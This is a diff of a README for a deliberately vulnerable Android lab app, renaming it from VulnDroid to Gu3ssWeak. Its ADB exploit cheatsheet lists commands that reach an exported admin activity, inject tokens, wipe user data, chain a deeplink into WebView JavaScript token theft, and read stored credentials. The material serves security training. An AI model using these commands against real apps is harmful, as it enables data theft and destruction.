@@ -6,8 +6,8 @@ A deliberately vulnerable Android application for mobile security research, bug 
 
 ## Quick Start
 
-    git clone git@github.com:b4sith-sec/VulnDroid.git
-    cd VulnDroid
+    git clone git@github.com:b4sith-sec/Gu3ssWeak.git
+    cd Gu3ssWeak
     ./gradlew assembleDebug
     adb install -r app/build/outputs/apk/debug/app-debug.apk
 
@@ -64,19 +64,19 @@ Launch the app, work through each lab, capture flags, and submit them on the in-
 ## ADB Exploit Cheatsheet
 
     # Admin panel - exported, no permission
-    adb shell am start -n com.vulndroid.app/.activities.AdminPanelActivity
+    adb shell am start -n com.gu3sswe4k.app/.activities.AdminPanelActivity
 
     # Token injection via broadcast
-    adb shell am broadcast -a com.vulndroid.app.SEND_TOKEN --es token FAKE --es user attacker
+    adb shell am broadcast -a com.gu3sswe4k.app.SEND_TOKEN --es token FAKE --es user attacker
 
     # Data wipe via exported service
-    adb shell am startservice -n com.vulndroid.app/.services.DataSyncService --es action wipe_user_data
+    adb shell am startservice -n com.gu3sswe4k.app/.services.DataSyncService --es action wipe_user_data
 
     # Deeplink to WebView RCE chain
-    adb shell am start -a android.intent.action.VIEW -d "vulndroid://settings?redirect=com.vulndroid.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"
+    adb shell am start -a android.intent.action.VIEW -d "vulndroid://settings?redirect=com.gu3sswe4k.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"
 
     # Read plaintext stored credentials
-    adb shell run-as com.vulndroid.app cat /data/data/com.vulndroid.app/shared_prefs/login_prefs.xml
+    adb shell run-as com.gu3sswe4k.app cat /data/data/com.gu3sswe4k.app/shared_prefs/login_prefs.xml
 
     # Watch for logged secrets
     adb logcat | grep Gu3ssWeak
